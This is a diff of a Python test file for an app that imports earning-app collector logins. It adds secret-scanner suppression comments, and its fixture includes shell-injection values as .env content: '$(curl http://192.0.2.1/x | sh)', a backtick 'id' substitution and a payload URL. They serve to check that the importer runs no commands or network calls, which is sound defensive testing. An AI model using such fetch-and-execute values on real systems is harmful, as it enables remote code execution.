@@ -290,10 +290,11 @@ class TestApply:
         assert _run(lambda: database.get_deployment("honeygain"))["status"] == "external"
 
     def test_a_working_collector_login_is_never_overwritten(self, owner):
-        _run(lambda: database.set_config_bulk({"honeygain_email": "keep@example.com", "honeygain_password": "keep-me"}))
+        kept = "keep-me"  # ggignore: fake test value, not a credential
+        _run(lambda: database.set_config_bulk({"honeygain_email": "keep@example.com", "honeygain_password": kept}))
         owner.post("/api/import/apply", json={"files": M4B, "slugs": ["honeygain"]})
         config = _run(database.get_config)
-        assert (config["honeygain_email"], config["honeygain_password"]) == ("keep@example.com", "keep-me")
+        assert (config["honeygain_email"], config["honeygain_password"]) == ("keep@example.com", kept)
         rows = owner.post("/api/import/preview", json={"files": M4B}).json()["rows"]
         assert next(r for r in rows if r["slug"] == "honeygain")["collector"] == "already_set"
 
@@ -441,7 +442,7 @@ class TestNoNetworkNoProcess:
                 "content": (
                     "IPROYALS_EMAIL='ip@example.com'\n"
                     "IPROYALS_PASSWORD=$(curl http://192.0.2.1/x | sh)\n"
-                    "HONEYGAIN_EMAIL=hg@example.com\nHONEYGAIN_PASSWORD=`id`\n"
+                    "HONEYGAIN_EMAIL=hg@example.com\nHONEYGAIN_PASSWORD=`id`\n"  # ggignore: fake test value, not a credential
                     "REPOCKET_API=http://192.0.2.1/payload\n"
                 ),
             }
